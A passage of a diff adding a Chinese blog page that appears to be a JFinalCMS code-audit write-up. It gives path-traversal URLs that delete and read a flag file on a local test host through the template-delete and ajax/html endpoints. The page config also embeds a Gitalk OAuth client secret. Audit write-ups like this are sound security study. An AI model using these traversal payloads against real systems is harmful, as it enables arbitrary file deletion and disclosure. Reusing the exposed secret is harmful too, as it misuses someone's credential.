+    data-src="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20240707172856234.png"
+    data-srcset="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20240707172856234.png, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20240707172856234.png 1.5x, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20240707172856234.png 2x"
+    data-sizes="auto"
+    alt="image-20240707172856234"
+    title="image-20240707172856234"/></p>
+<p><img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20240707172912044.png"
+    data-srcset="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20240707172912044.png, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20240707172912044.png 1.5x, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20240707172912044.png 2x"
+    data-sizes="auto"
+    alt="image-20240707172912044"
+    title="image-20240707172912044"/></p>
+<p>测试：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://192.168.3.214:8080/admin/template/delete?fileName=../../../../../../../../../../../../../../../../../../tmp/flag.txt
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20240707173853637.png"
+    data-srcset="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20240707173853637.png, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20240707173853637.png 1.5x, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20240707173853637.png 2x"
+    data-sizes="auto"
+    alt="image-20240707173853637"
+    title="image-20240707173853637"/></p>
+<p>同理，update也一样</p>
+<p><img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20240707174007145.png"
+    data-srcset="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20240707174007145.png, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20240707174007145.png 1.5x, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20240707174007145.png 2x"
+    data-sizes="auto"
+    alt="image-20240707174007145"
+    title="image-20240707174007145"/></p>
+<h2 id="任意文件读取-1">任意文件读取</h2>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://192.168.3.214:8080/ajax/html?html=../../../../../../../../../../../../../../../../../../tmp/flag.txt
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>目录穿越 直接渲染读取:</p>
+<p><img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20240707174123502.png"
+    data-srcset="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20240707174123502.png, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20240707174123502.png 1.5x, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20240707174123502.png 2x"
+    data-sizes="auto"
+    alt="image-20240707174123502"
+    title="image-20240707174123502"/></p>
+<h2 id="ssti">SSTI</h2>
+<p>待复现</p></div><div class="post-footer" id="post-footer">
+  <div class="post-info">
+    <div class="post-info-line">
+      <div class="post-info-mod">
+        <span title=2024-07-07&#32;11:11:00>更新于 2024-07-07&nbsp;</span>
+      </div><div class="post-info-license">
+          <span><a rel="license external nofollow noopener noreferrer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span>
+        </div></div>
+    <div class="post-info-line">
+      <div class="post-info-md"><span><a href="/jfinalcms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/index.md" title="阅读原始文档" class="link-to-markdown">阅读原始文档</a></span></div>
+      <div class="post-info-share">
+        <span></span>
+      </div>
+    </div>
+  </div>
+
+  <div class="post-info-more">
+    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href='/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/' class="post-tag">代码审计</a><a href='/tags/java%E5%AE%89%E5%85%A8/' class="post-tag">Java安全</a><a href='/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/' class="post-tag">渗透测试</a></section>
+    <section>
+      <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+    </section>
+  </div>
+
+  <div class="post-nav"><a href="/oasys%E7%B3%BB%E7%BB%9F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="post-nav-item" rel="prev" title="Oasys系统代码审计"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>Oasys系统代码审计</a></div>
+</div>
+<div id="comments"><div id="gitalk" class="comment"></div><noscript>
+        Please enable JavaScript to view the comments powered by <a href="https://github.com/gitalk/gitalk" rel="external nofollow noopener noreferrer">Gitalk</a>.
+      </noscript></div></article></main><footer class="footer">
+    <div class="footer-container"><div class="footer-line powered">由 <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreferrer" title="Hugo 0.128.2">Hugo</a> 强力驱动 | 主题 - <a href="https://github.com/hugo-fixit/FixIt" target="_blank" rel="external" title="FixIt v0.2.17-RC"><img class="fixit-icon" src="/fixit.min.svg" alt="FixIt logo" />&nbsp;FixIt</a>
+        </div><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
+            <span itemprop="copyrightYear">2019 - 2024</span><span class="author" itemprop="copyrightHolder">
+              <a href="http://shuai06.github.io"target="_blank" rel="external nofollow noopener noreferrer">剑胆琴心</a></span><span class="license footer-divider"><a rel="license external nofollow noopener noreferrer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div></div>
+  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="回到顶部"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric">0%</span>
+        </div><div class="fixed-button view-comments d-none" role="button" aria-label="查看评论"><i class="fa-solid fa-comment fa-fw" aria-hidden="true"></i></div></div><div id="mask"></div><div class="reading-progress-bar" style="left: 0;top: 0;--bg-progress: #000;--bg-progress-dark: #fff;"></div><noscript>
+    <div class="noscript-warning">FixIt 主题在启用 JavaScript 的情况下效果最佳。</div>
+  </noscript>
+</div><link rel="stylesheet" href="/lib/gitalk/gitalk.min.css"><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><link rel="stylesheet" href="/lib/pace/themes/blue/pace-theme-minimal.css"><script src="/lib/gitalk/gitalk.min.js"></script><script src="/lib/autocomplete/autocomplete.min.js" defer></script><script src="/lib/lunr/lunr.min.js" defer></script><script src="/lib/lunr/lunr.stemmer.support.min.js" defer></script><script src="/lib/lunr/lunr.zh.min.js" defer></script><script src="/lib/lazysizes/lazysizes.min.js" async defer></script><script src="/lib/cookieconsent/cookieconsent.min.js" defer></script><script src="/lib/pangu/pangu.min.js" defer></script><script src="/lib/cell-watermark/watermark.min.js" defer></script><script src="/lib/pace/pace.min.js" async defer></script><script>window.config={"autoBookmark":true,"code":{"copyTitle":"复制到剪贴板","editLockTitle":"锁定可编辑代码块","editUnLockTitle":"解锁可编辑代码块","editable":true,"maxShownLines":10},"comment":{"enable":true,"expired":false,"gitalk":{"admin":["shuai06"],"clientID":"d75ec1a5864747376f6f","clientSecret":"1b354dc131534bb3b7511213c74d3f9116a03a79","id":"2024-07-07T16:52:41+08:00","owner":"shuai06","repo":"hexo-gitalk","title":"Jfinalcms代码审计"}},"cookieconsent":{"content":{"dismiss":"同意","link":"了解更多","message":"本网站使用 Cookies 来改善您的浏览体验。"},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"enablePWA":true,"pangu":{"enable":true,"selector":"article"},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","lunrLanguageCode":"zh","lunrSegmentitURL":"/lib/lunr/lunr.segmentit.js","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"lunr"},"watermark":{"appendto":".wrapper\u003emain","colspacing":30,"content":"\u003cimg class=\"fixit-icon\" src=\"/images/avatar.png\" alt=\"FixIt logo\" /\u003e 剑胆琴心","enable":true,"fontfamily":"inherit","fontsize":0.85,"height":21,"opacity":0.0125,"rotate":15,"rowspacing":60,"width":150}};</script><script src="/js/theme.min.js" defer></script><script src="/js/custom.min.js" defer></script></body>
+</html>
